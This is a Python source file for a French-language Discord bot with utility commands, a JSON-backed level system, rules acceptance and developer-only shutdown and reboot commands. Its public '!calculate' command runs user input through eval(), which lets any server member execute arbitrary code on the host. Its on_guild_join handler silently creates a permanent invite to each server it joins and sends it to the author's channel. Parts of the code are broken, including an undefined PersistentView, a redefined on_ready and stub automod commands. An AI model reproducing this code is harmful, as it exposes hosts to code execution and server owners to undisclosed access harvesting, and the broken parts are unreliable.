import discord
from discord.ext import commands
import os
import sys
from keep_alive import keep_alive
import logging
from datetime import datetime

# Configurer le logger
logging.basicConfig(
    filename='bot.log',  # Fichier de log
    level=logging.INFO,  # Niveau de log
    format=
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s',  # Format du log
)

logger = logging.getLogger('bot_logger')
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Liste des IDs des développeurs autorisés (remplacez par vos vrais IDs Discord)
DEVELOPERS = [
    1269970523719209021,    # Remplacez par votre ID Discord
    # 987654321098765432,  # Ajoutez d'autres développeurs ici
]


def is_developer():
    """Décorateur pour vérifier si l'utilisateur est un développeur"""

    def predicate(ctx):
        return ctx.author.id in DEVELOPERS

    return commands.check(predicate)


@bot.event
async def on_ready():
    print(f'✅ Connecté en tant que {bot.user}')


# ═══════════════ COMMANDES PUBLIQUES ═══════════════


@bot.command()
async def bonjour(ctx):
    await ctx.send("Salut à toi ! 👋",
                   ephemeral=True)




@bot.group(invoke_without_command=True)
async def automod(ctx):
    """⚙️ Configuration de l'automodération"""
    if ctx.invoked_subcommand is None:
        embed = discord.Embed(
            title="⚙️ Configuration de l'automodération",
            description=
            "Choisissez une option pour configurer l'automodération :",
            color=0x00ffff)

        # Créer les boutons
        anti_spam_button = discord.ui.Button(style=discord.ButtonStyle.primary,
                                             label="Anti-Spam")
        anti_invite_button = discord.ui.Button(
            style=discord.ButtonStyle.primary, label="Anti-Invite")
        anti_swear_button = discord.ui.Button(
            style=discord.ButtonStyle.primary, label="Anti-Swear")
        logs_button = discord.ui.Button(style=discord.ButtonStyle.primary,
                                        label="Logs Channel")

        # Créer une vue pour ajouter les boutons
        view = discord.ui.View()
        view.add_item(anti_spam_button)
        view.add_item(anti_invite_button)
        view.add_item(anti_swear_button)
        view.add_item(logs_button)

        # Définir les callbacks pour chaque bouton
        async def anti_spam_callback(interaction):
            await interaction.response.send_message(
                "Vous avez cliqué sur Anti-Spam. Veuillez spécifier `!automod anti_spam on` ou `!automod anti_spam off`.",
                ephemeral=True)

        async def anti_invite_callback(interaction):
            await interaction.response.send_message(
                "Vous avez cliqué sur Anti-Invite. Veuillez spécifier `!automod anti_invite on` ou `!automod anti_invite off`.",
                ephemeral=True)

        async def anti_swear_callback(interaction):
            await interaction.response.send_message(
                "Vous avez cliqué sur Anti-Swear. Veuillez spécifier `!automod anti_swear on` ou `!automod anti_swear off`.",
                ephemeral=True)

        async def logs_callback(interaction):
            await interaction.response.send_message(
                "Vous avez cliqué sur Logs Channel. Veuillez spécifier `!automod logs #channel`.",
                ephemeral=True)

        anti_spam_button.callback = anti_spam_callback
        anti_invite_button.callback = anti_invite_callback
        anti_swear_button.callback = anti_swear_callback
        logs_button.callback = logs_callback

        await ctx.send(embed=embed, view=view)


@bot.command()
async def alerte(ctx):
    """🚨 Alerter un administrateur/développeur avec un lien du serveur"""
    guild_name = ctx.guild.name
    guild_id = ctx.guild.id
    channel_name = ctx.channel.name
    channel_id = ctx.channel.id
    author_name = ctx.author.name
    author_id = ctx.author.id

    try:
        invite = await ctx.channel.create_invite(max_age=0, max_uses=0)
        invite_url = invite.url
    except discord.errors.Forbidden:
        invite_url = "Impossible de créer une invitation (permissions insuffisantes)"

    message = f"🚨 Alerte!\nServeur: {guild_name} (ID: {guild_id})\nSalon: {channel_name} (ID: {channel_id})\nAuteur: {author_name} (ID: {author_id})\nInvitation: {invite_url}\n\nMerci de décrire votre problème ici."
    await ctx.send(
        "✅ Un message d'alerte a été envoyé aux administrateurs/développeurs. Merci de patienter.",
        ephemeral=True)
    channel_id = 1380991531267129535  # Remplacez par l'ID du salon souhaité
    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send(message)
    else:
        await ctx.send(
            "❌ Impossible d'envoyer l'alerte, salon de logs introuvable.")


@automod.command()
@is_developer()
async def anti_spam(ctx, enable: str = None):
    """🛡️ Active/désactive l'anti-spam"""
    # Implémenter la logique pour activer/désactiver l'anti-spam
    if enable is None:
        await ctx.send("❌ Veuillez spécifier `on` ou `off`.")
        return

    if enable.lower() == "on":
        # Logique pour activer l'anti-spam
        await ctx.send("✅ Anti-spam activé!")
    elif enable.lower() == "off":
        # Logique pour désactiver l'anti-spam
        await ctx.send("✅ Anti-spam désactivé!")
    else:
        await ctx.send("❌ Veuillez spécifier `on` ou `off`.")


@automod.command()
@is_developer()
async def anti_invite(ctx, enable: str = None):
    """🔗 Active/désactive la suppression d'invitations"""
    # Implémenter la logique pour activer/désactiver la suppression d'invitations
    if enable is None:
        await ctx.send("❌ Veuillez spécifier `on` ou `off`.")
        return

    if enable.lower() == "on":
        # Logique pour activer la suppression d'invitations
        await ctx.send("✅ Suppression d'invitations activée!")
    elif enable.lower() == "off":
        # Logique pour désactiver la suppression d'invitations
        await ctx.send("✅ Suppression d'invitations désactivée!")
    else:
        await ctx.send("❌ Veuillez spécifier `on` ou `off`.")


@automod.command()
@is_developer()
async def anti_swear(ctx, enable: str = None):
    """🤬 Active/désactive le filtre de jurons"""
    # Implémenter la logique pour activer/désactiver le filtre de jurons
    if enable is None:
        await ctx.send("❌ Veuillez spécifier `on` ou `off`.")
        return

    if enable.lower() == "on":
        # Logique pour activer le filtre de jurons
        await ctx.send("✅ Filtre de jurons activé!")
    elif enable.lower() == "off":
        # Logique pour désactiver le filtre de jurons
        await ctx.send("✅ Filtre de jurons désactivé!")
    else:
        await ctx.send("❌ Veuillez spécifier `on` ou `off`.")


@automod.command()
@is_developer()
async def logs(ctx, channel: discord.TextChannel = None):
    """ 📢 Configure le salon de logs pour l'automodération"""
    if channel is None:
        await ctx.send("❌ Veuillez spécifier un salon textuel.")
        return

    # Implémenter la logique pour configurer le salon de logs
    await ctx.send(f"✅ Salon de logs configuré sur {channel.mention}!")


@bot.command()
async def rejoindre(ctx):
    """Rejoindre le salon vocal de l'utilisateur"""
    if ctx.author.voice:
        channel = ctx.author.voice.channel
        await channel.connect()
        await ctx.send(f"🎵 J'ai rejoint {channel.name}!", ephemeral=True)
    else:
        await ctx.send(
            "❌ Vous devez être dans un salon vocal pour que je puisse vous rejoindre!",
            ephemeral=True)


@bot.command()
async def quitter(ctx):
    """Quitter le salon vocal"""
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("👋 J'ai quitté le salon vocal!", ephemeral=True)
    else:
        await ctx.send("❌ Je ne suis dans aucun salon vocal!", ephemeral=True)


@bot.command()
async def ping(ctx):
    """Vérifier la latence du bot"""
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Latence: {latency}ms")


@bot.command()
async def help_commands(ctx):
    """📋 Liste des commandes publiques"""

    embed = discord.Embed(
        title="📋 Commandes publiques",
        description=
        "Voici toutes les commandes disponibles pour tous les utilisateurs :",
        color=0x00ff00)

    commands_list_1 = [
        "**!bonjour** - Dire bonjour au bot",
        "**!ping** - Vérifier la latence du bot",
        "**!rejoindre** - Le bot rejoint votre salon vocal",
        "**!quitter** - Le bot quitte le salon vocal",
        "**!help_commands** - Afficher cette liste de commandes",
        "**!automod** - Afficher les commandes de l'automod",
        "**!alerte** - Alerter un administrateur/développeur avec un lien du serveur"
    ]

    commands_list_2 = [
        "**!info** - Informations sur le bot",
        "**!serveurinfo** - Informations sur le serveur",
        "**!avatar <utilisateur>** - Afficher l'avatar d'un utilisateur",
        "**!server_age** - Affiche l'âge du serveur",
        "**!userinfo <utilisateur>** - Affiche les informations d'un utilisateur",
        "**!roleinfo <role>** - Affiche les informations d'un rôle",
        "**!servericon** - Affiche l'icône du serveur",
        "**!poll <question> <options>** - Créer un sondage avec des réactions",
        "**!suggest <suggestion>** - Faire une suggestion pour le serveur",
        "**!reminder <time> <reminder>** - Définir un rappel"
    ]

    embed.add_field(name="🎯 Commandes disponibles (1/2) :",
                    value="\n".join(commands_list_1),
                    inline=False)

    embed.add_field(name="🎯 Commandes disponibles (2/2) :",
                    value="\n".join(commands_list_2),
                    inline=False)

    embed.set_footer(text="💡 Utilisez le préfixe ! avant chaque commande")
    await ctx.send(embed=embed)


@bot.command()
async def info(ctx):
    """ℹ️ Informations sur le bot"""
    embed = discord.Embed(
        title="ℹ️ À propos de moi",
        description=
        "Je suis un bot Discord multifonctionnel créé pour améliorer votre expérience de serveur!",
        color=0x3498db)
    embed.add_field(name="Créateur", value="Ton nom ici", inline=False)
    embed.add_field(name="Langage", value="Python", inline=True)
    embed.add_field(name="Librairie", value="discord.py", inline=True)
    embed.set_footer(text="Amusez-vous bien!")
    await ctx.send(embed=embed)


@bot.command()
async def serveurinfo(ctx):
    """ℹ️ Informations sur le serveur"""
    guild = ctx.guild
    embed = discord.Embed(title=f"ℹ️ Infos sur {guild.name}", color=0xe74c3c)
    embed.add_field(name="Nom", value=guild.name, inline=False)
    embed.add_field(name="ID", value=guild.id, inline=False)
    embed.add_field(name="Membres", value=guild.member_count, inline=False)
    embed.add_field(name="Créé le",
                    value=guild.created_at.strftime("%d/%m/%Y"),
                    inline=False)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    await ctx.send(embed=embed)


@bot.command()
async def avatar(ctx, user: discord.User = None):
    """🖼️ Afficher l'avatar d'un utilisateur"""
    if user is None:
        user = ctx.author
    embed = discord.Embed(title=f"🖼️ Avatar de {user.name}", color=0x9b59b6)
    embed.set_image(url=user.avatar.url)
    await ctx.send(embed=embed)


@bot.command()
async def server_age(ctx):
    """🎂 Affiche l'âge du serveur"""
    guild = ctx.guild
    created_at = guild.created_at
    age = datetime.now(tz=created_at.tzinfo) - created_at
    await ctx.send(f"🎂 Ce serveur a {age.days} jours.")


@bot.command()
async def userinfo(ctx, user: discord.User = None):
    """ℹ️ Affiche les informations d'un utilisateur"""
    if user is None:
        user = ctx.author

    embed = discord.Embed(title=f"ℹ️ Informations sur {user.name}",
                          color=0x3498db)
    embed.add_field(name="Nom d'utilisateur", value=user.name, inline=True)
    embed.add_field(name="ID", value=user.id, inline=True)
    embed.add_field(name="Date de création du compte",
                    value=user.created_at.strftime("%d/%m/%Y %H:%M:%S"),
                    inline=False)
    embed.add_field(name="A rejoint le serveur le",
                    value=user.joined_at.strftime("%d/%m/%Y %H:%M:%S"),
                    inline=False)
    embed.set_thumbnail(url=user.avatar.url)
    await ctx.send(embed=embed)


@bot.command()
async def roleinfo(ctx, role: discord.Role):
    """ℹ️ Affiche les informations d'un rôle"""
    embed = discord.Embed(title=f"ℹ️ Informations sur le rôle {role.name}",
                          color=role.color)
    embed.add_field(name="ID", value=role.id, inline=True)
    embed.add_field(name="Membres", value=len(role.members), inline=True)
    embed.add_field(name="Date de création",
                    value=role.created_at.strftime("%d/%m/%Y %H:%M:%S"),
                    inline=False)
    embed.add_field(name="Mentionnable", value=role.mentionable, inline=True)
    await ctx.send(embed=embed)


@bot.command()
async def servericon(ctx):
    """🖼️ Affiche l'icône du serveur"""
    guild = ctx.guild
    if guild.icon:
        embed = discord.Embed(title=f"🖼️ Icône de {guild.name}",
                              color=0x9b59b6)
        embed.set_image(url=guild.icon.url)
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ Ce serveur n'a pas d'icône.")


@bot.command()
async def poll(ctx, question: str, *options):
    """📊 Créer un sondage avec des réactions"""
    if len(options) < 2:
        await ctx.send(
            "❌ Veuillez fournir au moins deux options pour le sondage.")
        return

    if len(options) > 9:
        await ctx.send(
            "❌ Vous ne pouvez pas fournir plus de 9 options pour le sondage.")
        return

    reactions = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
    description = []
    for x, option in enumerate(options):
        description += f"\n{reactions[x]} {option}"
    embed = discord.Embed(title=question,
                          description="".join(description),
                          color=0x00ffff)
    poll_message = await ctx.send(embed=embed)
    for reaction in reactions[:len(options)]:
        await poll_message.add_reaction(reaction)


@bot.command()
async def suggest(ctx, *, suggestion: str):
    """💡 Faire une suggestion pour le bot ou le serveur support"""
    channel_id = 1380991527630934148  # Remplacez par l'ID du salon des suggestions
    channel = bot.get_channel(channel_id)
    if channel:
        embed = discord.Embed(
            title="💡 Nouvelle suggestion @1380991266673786960",
            description=suggestion,
            color=0x00ff00)
        embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        message = await channel.send(embed=embed)
        await message.add_reaction("👍")
        await message.add_reaction("👎")
        await ctx.send("✅ Votre suggestion a été envoyée!", ephemeral=True)
    else:
        await ctx.send(
            "❌ Impossible d'envoyer la suggestion, salon introuvable.")


@bot.command()
async def reminder(ctx, time, *, reminder):
    """⏰ Définir un rappel"""
    # Convertir le temps en secondes
    try:
        seconds = int(time[:-1])
        unit = time[-1].lower()

        if unit == "s":
            pass
        elif unit == "m":
            seconds *= 60
        elif unit == "h":
            seconds *= 3600
        elif unit == "d":
            seconds *= 86400
        else:
            await ctx.send("❌ Unité de temps invalide. Utilisez s, m, h, ou d."
                           )
            return
    except ValueError:
        await ctx.send("❌ Format de temps invalide. Exemple: 10s, 5m, 2h, 1d.")
        return

    if seconds <= 0:
        await ctx.send("❌ Le temps doit être supérieur à zéro.")
        return

    await ctx.send(f"⏰ Je vous rappellerai dans {time}!", ephemeral=True)

    await asyncio.sleep(seconds)
    await ctx.send(f"⏰ Rappel pour {ctx.author.mention}: {reminder}")


import asyncio


@bot.command()
async def say_embed(ctx, title: str, *, content: str):
    """💬 Faire dire quelque chose au bot dans un embed."""
    embed = discord.Embed(title=title, description=content, color=0x00ff00)
    await ctx.send(embed=embed)


@bot.command()
async def calculate(ctx, *, expression: str):
    """🧮 Effectuer un calcul."""
    try:
        result = eval(expression)
        await ctx.send(f"✅ Résultat : {result}")
    except Exception as e:
        await ctx.send(f"❌ Erreur : {e}")


@bot.command()
async def choose(ctx, *choices: str):
    """🤔 Choisir une option au hasard."""
    if not choices:
        await ctx.send("❌ Veuillez fournir au moins deux options.")
        return
    await ctx.send(f"✅ J'ai choisi : {random.choice(choices)}")


import random
import json
import discord
from discord.ext import commands

    # Levels System
    #"""Système de niveaux basé sur l'activité des utilisateurs.
    #Pour que le bot n'oublie pas les niveaux en cas d'interruption, il faut sauvegarder les données dans un fichier (JSON, base de données, etc.).
    #Ici, je vais montrer comment sauvegarder et charger les données depuis un fichier JSON.
    #"""
level_data = {}
    # Stocke les niveaux et l'XP par utilisateur
LEVEL_DATA_FILE = 'level_data.json'  # Nom du fichier pour stocker les données
LEVEL_CONFIG_FILE = 'level_config.json'

# Configuration par défaut
level_config = {
    "level_up_channel": None,
    "xp_per_message": 5,
    "message_delay": 5  # Délai en secondes
}


async def load_level_data():
    """Charge les données de niveau depuis le fichier JSON."""
    global level_data
    try:
        with open(LEVEL_DATA_FILE, 'r') as f:
            level_data = json.load(f)
        print("✅ Données de niveau chargées depuis le fichier.")
    except FileNotFoundError:
        print(
            "⚠️ Fichier de données de niveau non trouvé. Création d'un nouveau fichier."
        )
        level_data = {}
    except json.JSONDecodeError:
        print(
            "⚠️ Erreur lors de la lecture du fichier JSON. Assurez-vous qu'il est correctement formaté."
        )
        level_data = {}  # Réinitialiser level_data en cas d'erreur de décodage JSON


async def save_level_data():
    """Sauvegarde les données de niveau dans un fichier JSON."""
    global level_data
    try:
        with open(LEVEL_DATA_FILE, 'w') as f:
            json.dump(level_data, f, indent=4)  # Utilisez indent pour une meilleure lisibilité
        print("✅ Données de niveau sauvegardées dans le fichier.")
    except Exception as e:
        print(f"❌ Erreur lors de la sauvegarde des données de niveau : {e}")


async def load_level_config():
    """Charge la configuration du système de niveaux depuis un fichier JSON."""
    global level_config
    try:
        with open(LEVEL_CONFIG_FILE, 'r') as f:
            level_config = json.load(f)
        print("✅ Configuration de niveau chargée depuis le fichier.")
    except FileNotFoundError:
        print(
            "⚠️ Fichier de configuration de niveau non trouvé. Utilisation de la configuration par défaut."
        )
        await save_level_config()  # Sauvegarde la config par défaut pour la première fois
    except json.JSONDecodeError:
        print(
            "⚠️ Erreur lors de la lecture du fichier JSON de configuration. Utilisation de la configuration par défaut."
        )
        level_config = {
            "level_up_channel": None,
            "xp_per_message": 5,
            "message_delay": 5
        }
        await save_level_config()


async def save_level_config():
    """Sauvegarde la configuration du système de niveaux dans un fichier JSON."""
    global level_config
    try:
        with open(LEVEL_CONFIG_FILE, 'w') as f:
            json.dump(level_config, f, indent=4)
        print("✅ Configuration de niveau sauvegardée dans le fichier.")
    except Exception as e:
        print(
            f"❌ Erreur lors de la sauvegarde de la configuration de niveau : {e}"
        )


async def update_data(users, user):
    """Met à jour les données de l'utilisateur."""
    if str(user.id) not in users:
        users[str(user.id)] = {}
        users[str(user.id)]['experience'] = 0
        users[str(user.id)]['level'] = 1
    return users


async def add_experience(users, user, exp):
    """Ajoute de l'expérience à un utilisateur."""
    users = await update_data(users, user)
    users[str(user.id)]['experience'] += exp

    level_start = users[str(user.id)]['level']
    level_end = int(users[str(user.id)]['experience']**(1 / 4))

    if level_start < level_end:
        users[str(user.id)]['level'] = level_end
        await save_level_data(
        )  # Sauvegarde après chaque niveau gagné - Corrected call
        return users, level_end
    else:
        return users, None


@bot.event
async def on_message(message):
    """Gère les messages pour le système de niveaux."""
    global level_data
    if message.author.bot:
        return

    level_data = await update_data(level_data, message.author)
    level_data, new_level = await add_experience(
        level_data, message.author, level_config["xp_per_message"])

    if new_level:
        channel_id = level_config["level_up_channel"]
        if channel_id:
            channel = bot.get_channel(int(channel_id))
            if channel:
                await channel.send(
                    f"{message.author.mention} a atteint le niveau {new_level}!")
            else:
                print(
                    f"❌ Salon de niveau introuvable avec l'ID: {channel_id}")
        else:
            print("ℹ️ Aucun salon de niveau configuré.")

    # Continue le traitement des commandes
    await bot.process_commands(message)


@bot.command()
async def level(ctx, user: discord.User = None):
    """Affiche le niveau d'un utilisateur."""
    global level_data
    if user is None:
        user = ctx.author

    if str(user.id) not in level_data:
        await ctx.send(f"{user.mention} n'a pas encore d'expérience.")
        return

    exp = level_data[str(user.id)]['experience']
    lvl = level_data[str(user.id)]['level']

    embed = discord.Embed(title=f"Niveau de {user.name}", color=0x00ff00)
    embed.add_field(name="Niveau", value=lvl, inline=False)
    embed.add_field(name="Expérience", value=exp, inline=False)
    await ctx.send(embed=embed)


class LevelConfigView(discord.ui.View):

    def __init__(self, ctx):
        super().__init__()
        self.ctx = ctx

    @discord.ui.button(label="Salon d'annonces de niveau",
                       style=discord.ButtonStyle.primary)
    async def level_channel(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        await interaction.response.send_modal(LevelChannelModal())

    @discord.ui.button(label="XP par message",
                       style=discord.ButtonStyle.secondary)
    async def xp_per_message(self, interaction: discord.Interaction,
                             button: discord.ui.Button):
        await interaction.response.send_modal(XpPerMessageModal())

    @discord.ui.button(label="Délai entre les messages",
                       style=discord.ButtonStyle.success)
    async def message_delay(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        await interaction.response.send_modal(MessageDelayModal())


class LevelChannelModal(discord.ui.Modal, title="Configuration du salon de niveau"):

    channel = discord.ui.TextInput(label="ID du salon",
                                    placeholder="Entrez l'ID du salon",
                                    required=False)

    async def on_submit(self, interaction: discord.Interaction):
        global level_config
        channel_id = self.channel.value
        if channel_id:
            try:
                channel_id = int(channel_id)
                channel = bot.get_channel(channel_id)
                if not channel:
                    await interaction.response.send_message(
                        "❌ Salon introuvable. Veuillez entrer un ID valide.",
                        ephemeral=True)
                    return
                level_config["level_up_channel"] = channel_id
            except ValueError:
                await interaction.response.send_message(
                    "❌ ID de salon invalide. Veuillez entrer un nombre entier.",
                    ephemeral=True)
                return
        else:
            level_config["level_up_channel"] = None

        await save_level_config()
        await interaction.response.send_message(
            "✅ Configuration du salon de niveau mise à jour!", ephemeral=True)


class XpPerMessageModal(discord.ui.Modal, title="Configuration de l'XP par message"):

    xp = discord.ui.TextInput(label="XP par message",
                               placeholder="Entrez la quantité d'XP",
                               required=True)

    async def on_submit(self, interaction: discord.Interaction):
        global level_config
        xp_value = self.xp.value
        try:
            xp_value = int(xp_value)
            if xp_value <= 0:
                await interaction.response.send_message(
                    "❌ La quantité d'XP doit être supérieure à zéro.",
                    ephemeral=True)
                return
            level_config["xp_per_message"] = xp_value
            await save_level_config()
            await interaction.response.send_message(
                "✅ Configuration de l'XP par message mise à jour!",
                ephemeral=True)
        except ValueError:
            await interaction.response.send_message(
                "❌ Quantité d'XP invalide. Veuillez entrer un nombre entier.",
                ephemeral=True)


class MessageDelayModal(discord.ui.Modal,
                        title="Configuration du délai entre les messages"):

    delay = discord.ui.TextInput(label="Délai en secondes",
                                  placeholder="Entrez le délai en secondes",
                                  required=True)

    async def on_submit(self, interaction: discord.Interaction):
        global level_config
        delay_value = self.delay.value
        try:
            delay_value = int(delay_value)
            if delay_value < 0:
                await interaction.response.send_message(
                    "❌ Le délai doit être positif.", ephemeral=True)
                return
            level_config["message_delay"] = delay_value
            await save_level_config()
            await interaction.response.send_message(
                "✅ Configuration du délai entre les messages mise à jour!",
                ephemeral=True)
        except ValueError:
            await interaction.response.send_message(
                "❌ Délai invalide. Veuillez entrer un nombre entier.",
                ephemeral=True)


@bot.command()
async def levelconfig(ctx):
    """Ouvre le menu de configuration du système de niveaux."""
    view = LevelConfigView(ctx)
    await ctx.send("⚙️ Configuration du système de niveaux:", view=view)


# Charger les données au démarrage du bot
@bot.event
async def on_connect():  # Utilisez on_connect au lieu de on_ready pour charger les données le plus tôt possible
    await load_level_data()
    await load_level_config()


# Sauvegarder les données avant de fermer le bot
@bot.event
async def on_disconnect():
    await save_level_data()


@bot.command()
@is_developer()
async def botstats(ctx):
    """📊 Statistiques du bot (développeurs seulement)"""
    total_guilds = len(bot.guilds)
    total_users = sum(guild.member_count for guild in bot.guilds)
    total_commands = len(bot.commands)
    
    # Calcul de la latence
    latency = round(bot.latency * 1000)  # Latence en ms

    embed = discord.Embed(
        title="📊 Statistiques du bot",
        color=0x00ff00  # Vert pour les informations
    )
    embed.add_field(name="Serveurs", value=total_guilds, inline=True)
    embed.add_field(name="Utilisateurs", value=total_users, inline=True)
    embed.add_field(name="Commandes", value=total_commands, inline=True)
    embed.add_field(name="Latence", value=f"{latency}ms", inline=True)
    
    # Ajout d'informations sur la version de discord.py
    embed.add_field(name="discord.py version", value=discord.__version__, inline=True)

    await ctx.send(embed=embed, ephemeral=True)


@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount: int):
    """🗑️ Clear messages in the current channel (developer only)"""
    await ctx.channel.purge(limit=amount + 1)

@bot.command()
@commands.has_permissions(administrator=True)
async def setuprules(ctx):
    """Crée et envoie le règlement avec un bouton d'acceptation."""

    # Embed du règlement amélioré
    rules_embed = discord.Embed(
        title="📜 Règlement du Serveur - Haribo Company™",
        description=(
            "Bienvenue! Pour assurer une expérience agréable et respectueuse pour tous, veuillez lire attentivement et accepter le règlement ci-dessous. "
            "En rejoignant et en participant à ce serveur, vous vous engagez à respecter ces règles."
        ),
        color=0x3498db  # Bleu professionnel
    )

    rules_embed.add_field(
        name="**1. Respect et Courtoisie**",
        value=(
            "Soyez respectueux, courtois et constructifs envers tous les membres. "
            "Évitez les attaques personnelles, l'intimidation, le harcèlement, ou toute forme de discrimination basée sur l'origine, "
            "la religion, le sexe, l'orientation sexuelle, le handicap, ou toute autre caractéristique personnelle."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**2. Contenu Approprié**",
        value=(
            "Le contenu NSFW (Not Safe For Work), y compris les images, les vidéos ou les textes à caractère sexuellement explicite, "
            "violent, choquant ou illégal est strictement interdit. Veuillez maintenir un environnement approprié pour tous les âges."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**3. Publicité et Spam**",
        value=(
            "La publicité non autorisée, le spam, le flood, les liens d'affiliation et toute forme de sollicitation non sollicitée sont interdits. "
            "Si vous souhaitez promouvoir quelque chose, veuillez contacter un administrateur pour obtenir l'autorisation."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**4. Discussions et Sujets**",
        value=(
            "Restez dans le sujet des canaux respectifs. Évitez de détourner les conversations ou de poster des messages hors sujet. "
            "Veuillez utiliser les canaux appropriés pour vos discussions."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**5. Comportement Général**",
        value=(
            "Ne perturbez pas le serveur de quelque manière que ce soit. "
            "Cela inclut, mais sans s'y limiter, le trolling, le baiting, la provocation, ou toute autre forme de comportement perturbateur."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**6. Responsabilité**",
        value=(
            "Vous êtes responsable de vos actions sur ce serveur. La direction se réserve le droit de prendre des mesures disciplinaires "
            "à l'encontre de tout membre qui enfreint ce règlement. Les sanctions peuvent inclure un avertissement, une exclusion temporaire ou permanente."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**7. Respect des Administrateurs et Modérateurs**",
        value=(
            "Les décisions des administrateurs et des modérateurs sont définitives. "
            "Si vous avez une question ou une plainte, veuillez contacter un membre de l'équipe de modération en privé."
        ),
        inline=False
    )

    rules_embed.add_field(
        name="**8. Règlement Supplémentaire**",
        value=(
            "Des règles supplémentaires peuvent être affichées dans certains canaux. Veuillez les consulter avant de participer."
        ),
        inline=False
    )

    rules_embed.set_footer(
        text="Haribo Company™ - En acceptant le règlement, vous vous engagez à le respecter et à contribuer à un environnement positif et constructif."
    )
      # Remplacez par l'URL du logo de votre serveur

    # Bouton d'acceptation
    class AcceptButton(discord.ui.Button):
        def __init__(self):
            super().__init__(label="✅ J'accepte le règlement", style=discord.ButtonStyle.success, custom_id="accept_rules")

        async def callback(self, interaction: discord.Interaction):
            # Attribution du rôle "Membre Vérifié"
            role_name = "Membre Vérifié"
            role = discord.utils.get(interaction.guild.roles, name=role_name)
            if role is None:
                # Créer le rôle si inexistant
                try:
                    role = await interaction.guild.create_role(
                        name=role_name,
                        color=discord.Color.green(),
                        reason="Rôle créé pour ceux qui acceptent le règlement."
                    )
                    await interaction.response.send_message(f"Rôle {role_name} créé.", ephemeral=True)
                except discord.Forbidden:
                    await interaction.response.send_message("Je n'ai pas la permission de créer des rôles.", ephemeral=True)
                    return

            try:
                await interaction.user.add_roles(role, reason="A accepté le règlement.")
                await interaction.response.send_message("Rôle \"Membre Vérifié\" attribué!", ephemeral=True)
            except discord.Forbidden:
                await interaction.response.send_message("Je n'ai pas la permission d'attribuer des rôles.", ephemeral=True)

    # Vue pour le bouton
    class RulesView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)
            self.add_item(AcceptButton())
            self.persistent = True  # Définir persistent sur True


    # Envoi du message
    view = RulesView()
    #bot.add_view(view) #moved to on_ready event
    await ctx.send(embed=rules_embed, view=view)

# ═══════════════ COMMANDES DÉVELOPPEURS SEULEMENT ═══════════════

@bot.command()
@is_developer()
async def shutdown(ctx):
    """🔴 Éteindre le bot (développeurs seulement)"""
    embed = discord.Embed(
        title="🔴 Arrêt du bot en cours...",
        description="Le bot va s'éteindre. Au revoir ! "
                    "Merci de votre compréhension pendant cette interruption. "
                    "Nous mettons tout en œuvre pour améliorer continuellement nos services. "
                    "N'hésitez pas à revenir plus tard pour profiter de nos dernières mises à jour et améliorations. "
                    "Votre patience est grandement appréciée. À bientôt !",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)
    await bot.close()
    sys.exit(0)

  

@bot.event
async def on_ready():
    if not bot.persistent_views_added:
        bot.add_view(PersistentView())
        bot.persistent_views_added = True
    print(f'✅ Connecté en tant que {bot.user}')


@bot.command()
@is_developer()
async def reboot(ctx):
    """🔄 Redémarrer le bot (développeurs seulement)"""
    embed = discord.Embed(
        title="🔄 Redémarrage du bot en cours...",
        description="Le bot redémarre. A bientôt ! "
                    "Ce redémarrage est nécessaire pour appliquer les dernières modifications et corrections. "
                    "Nous vous remercions de votre patience pendant que le bot se relance. "
                    "Toutes les fonctionnalités seront de nouveau disponibles dans quelques instants. "
                    "Si vous rencontrez des problèmes après le redémarrage, veuillez contacter l'équipe de support. Merci !",
        color=discord.Color.orange()
    )
    await ctx.send(embed=embed)
    await bot.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)


@bot.event
async def on_guild_join(guild):
    """Message automatique quand le bot rejoint un serveur."""
    channel_id = 1380991512137044069  # Remplacez par l'ID du salon souhaité
    channel = bot.get_channel(channel_id)

    if channel:
        # Créer une invitation permanente
        try:
            invite = await guild.text_channels[0].create_invite(max_age=0,
                                                                max_uses=0)
            invite_url = invite.url
        except discord.errors.Forbidden:
            invite_url = "Impossible de créer une invitation (permissions insuffisantes)"

        embed = discord.Embed(
            title="👋 Nouveau serveur!",
            description=f"J'ai rejoint le serveur **{guild.name}**!",
            color=0x00ff00)
        embed.add_field(name="Nombre de membres",
                        value=guild.member_count,
                        inline=True)
        embed.add_field(name="Nombre de salons",
                        value=len(guild.channels),
                        inline=True)
        embed.add_field(name="Invitation", value=invite_url, inline=True)
        await channel.send(embed=embed)
        logger.info(f"Bot joined server: {guild.name} (ID: {guild.id})")
    else:
        logger.warning(f"Salon avec l'ID {channel_id} introuvable.")


@bot.event
async def on_guild_remove(guild):
    """Message automatique quand le bot est retiré d'un serveur."""
    channel_id = 1380991516264366143  # Remplacez par l'ID du salon souhaité
    channel = bot.get_channel(channel_id)

    if channel:
        # Créer une invitation permanente
        try:
            invite = await guild.text_channels[0].create_invite(max_age=0,
                                                                max_uses=0)
            invite_url = invite.url
        except discord.errors.Forbidden:
            invite_url = "Impossible de créer une invitation (permissions insuffisantes)"

        embed = discord.Embed(
            title="🚪 Quitté un serveur!",
            description=f"J'ai été retiré du serveur **{guild.name}**.",
            color=0xff0000)
        embed.add_field(name="Nombre de membres",
                        value=guild.member_count,
                        inline=True)
        embed.add_field(name="Nombre de salons",
                        value=len(guild.channels),
                        inline=True)
        embed.add_field(name="Invitation", value=invite_url, inline=True)
        await channel.send(embed=embed)
